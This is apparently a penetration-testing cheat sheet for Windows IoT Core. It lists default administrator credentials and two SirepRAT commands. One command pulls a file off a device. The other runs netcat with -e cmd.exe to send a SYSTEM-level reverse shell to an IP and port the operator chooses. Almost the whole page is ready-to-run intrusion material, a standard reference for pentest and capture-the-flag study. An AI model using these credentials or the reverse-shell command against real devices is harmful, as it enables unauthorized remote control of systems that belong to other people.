# windows iot core

## Default Creds

```
Administrator:p@ssw0rd
administrator:p@ssw0rd
```

## RCE as system

```bash
https://github.com/SafeBreach-Labs/SirepRAT

python3 SirepRAT.py IP GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
python3 SirepRAT.py IP LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c nc.exe -e C:\Windows\System32\cmd.exe IP PORT "
```
